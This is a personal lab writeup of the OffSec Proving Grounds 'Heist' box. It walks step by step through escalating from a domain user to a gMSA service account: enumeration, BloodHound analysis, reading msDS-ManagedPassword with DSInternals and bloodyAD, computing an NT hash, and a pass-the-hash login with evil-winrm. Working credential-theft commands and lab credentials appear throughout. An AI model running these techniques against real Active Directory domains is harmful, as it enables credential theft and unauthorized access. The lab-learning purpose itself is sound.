# Local Enumeration

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

(Access Denied)

`whoami /priv`

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We could likely abuse SeChangeNotifyPrivilege to grant ourselves full access to the C: drive via DLL hijacking, similarly to [[svc_mssql -> System]] in the [[Archive/OFFSEC - Proving Grounds Writeups/Windows/Access/index|Access]] proving grounds box.

We'll keep this in mind while we keep enumerating.

`net user`

```
Administrator            enox                     Guest
krbtgt
```

`net user enox`

```
User name                    enox
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/31/2021 6:09:05 AM
Password expires             Never
Password changeable          9/1/2021 6:09:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/17/2025 7:48:34 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Web Admins           *Domain Users
The command completed successfully.
```

`ipconfig /all`

```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC01
   Primary Dns Suffix  . . . . . . . : heist.offsec
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : heist.offsec

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-86-0A-56
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::94ef:382d:b980:5145%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.109.165(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.109.254
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-28-88-61-00-00-50-56-8A-53-00
   DNS Servers . . . . . . . . . . . : 192.168.109.254
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

# winPEAS
Download winPEASx64.exe to attacking machine, then `upload` to the target from the evil-winrm shell, just as we did for `SauronEye.exe` in [[5985, 47001 WinRM]].

`.\winPEASx64.exe | Tee-Object -FilePath ".\output.txt"`

(No useful findings)

# Active Directory Enumeration
# [[88 Kerberos|88 Kerberos]]
No accounts are vulnerable to Kerberoasting or AS-REP Roasting.

# Bloodhound

- Transfer sharphound.exe to target, run and then download the output .zip file to attacking machine
- Set up a Bloodhound instance on attacking machine: https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart#install-bloodhound-ce
- Reset default password (use `admin` for sign in, despite the form asking for an email)
- Navigate to /ui/administration/file-ingest and upload sharphound's .zip (I renamed to sharphound.zip) to ingest the data

![[Pasted image 20250807143743.png]]

Then I'll navigate to "Pathfinding", search for the Enox user, and mark it as owned.

![[Pasted image 20250807143931.png]]

Going through enox's properties, I see that under Outbound Object Control, we have control over SVC_APACHE$@HEIST.OFFSEC via our group membership in WEB ADMINS.

![[Pasted image 20250817081245.png]]

This indicates svc_apache is a Group Managed Service Account (gMSA) since it has permissions to read the gMSA password.

Let's confirm in PowerShell:

`Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq “msDS-GroupManagedServiceAccount”}`

```
DistinguishedName : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
Enabled           : True
Name              : svc_apache
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : d40bc264-0c4e-4b86-b3b9-b775995ba303
SamAccountName    : svc_apache$
SID               : S-1-5-21-537427935-490066102-1511301751-1105
UserPrincipalName :
```

https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/

```
$gmsa = Get-ADServiceAccount `
	-Identity 'svc_apache' `
	-Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
```

The guide recommends using the following to decode the blob into a usable format but it requires the DSInternals PowerShell module to be installed. 
`ConvertFrom-ADManagedPasswordBlob $mp`

Instead, I'm going to write to a file and download to my system:

`[IO.File]::WriteAllBytes("C:\Users\enox\Documents\svc_apache_blob.bin", $mp)`
`download svc_apache_blob.bin`

![[Pasted image 20250817084815.png]]

Now, opening a new shell on my kali system:
```
pwsh
Install-Module DSInternals
$blob = [IO.File]::ReadAllBytes("svc_apache_blob.bin")
ConvertFrom-ADManagedPasswordBlob -Blob $blob
```

![[Pasted image 20250817085707.png]]

Lastly, as the guide also noted, this is not really a usable format, as it contains characters that cannot be typed. However, we should be able to calculate the NT hash:

```
# Load DSInternals
Import-Module DSInternals

# Read the gMSA blob
$blob = [IO.File]::ReadAllBytes("svc_apache_blob.bin")

# Decode to get the SecureString password
$decoded = ConvertFrom-ADManagedPasswordBlob -Blob $blob

# Convert SecureString to plaintext
$ptr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($decoded.SecureCurrentPassword)
$plainPwd = [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr)

# Export as UTF-16LE bytes for NT hash computation
[IO.File]::WriteAllBytes("svc_apache_utf16le.bin",[Text.Encoding]::Unicode.GetBytes($plainPwd))

```

```
# nt_hash.py
import hashlib

# Read the raw UTF-16LE bytes
with open("svc_apache_utf16le.bin", "rb") as f:
    password_bytes = f.read()

# Compute NT hash (MD4)
nt_hash = hashlib.new('md4', password_bytes).hexdigest()
print(nt_hash)
```

`e42d42e40efe812ac7dbd1466d673d15`

```
evil-winrm -i DC01.heist.offsec -u 'svc_apache$' -H 'e42d42e40efe812ac7dbd1466d673d15'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

This still didn't work and became quite the time sink. 

Let's retry. If I actually read the Bloodhound output, I'd see that it recommends a specific tools for Windows abuse: https://github.com/rvazarkar/GMSAPasswordReader

However this is C# and needs to be built in Visual Studio. As I don't have easy access to a Windows installation right now, I'm going to keep looking.

```
sudo apt -y install bloodyad
bloodyAD --host DC01.heist.offsec -d heist.offsec -u enox -p california get object svc_apache$ --attr msDS-ManagedPassword
```

```
distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:c17a10393707da9b69d04cedbf59a939
msDS-ManagedPassword.B64ENCODED: 2L0rtuVfabxRAbH/cttP9nclwBeajgigb578aAKYzNlCvq3sZHUIPcYKUyqsyVI9PTEZKamQyn6Y7RyKQCd0SP/4711Ww75LmaYVJ5/EAM+4NP9XXUrf2M3mbcMbO0gmWAGso5J/yFs83CaedQnYtMax1+vsFz5BKjCE7CGoOlFW47JHY0TrDz5LSbemqqnMPm36GZ/GmLDGEunobb1DnV621JAEAbyHPX4cNraAKyOjR+zQzF8woiAb5yMMBiOYwgnTyElit1l4lkG2bp/e6oGxwRs2QSioLGJTClROUfYWr1X5D0mhLpALaLUjsibgp1FzMX/qHUCmTtlNzjlNyA==
```

WOW I wasted so much time, that was easy...

`evil-winrm -i DC01.heist.offsec -u svc_apache$ -H c17a10393707da9b69d04cedbf59a939`

![[Pasted image 20250817094200.png]]

# Continue: [[svc_apache$ -> Domain Admin]]
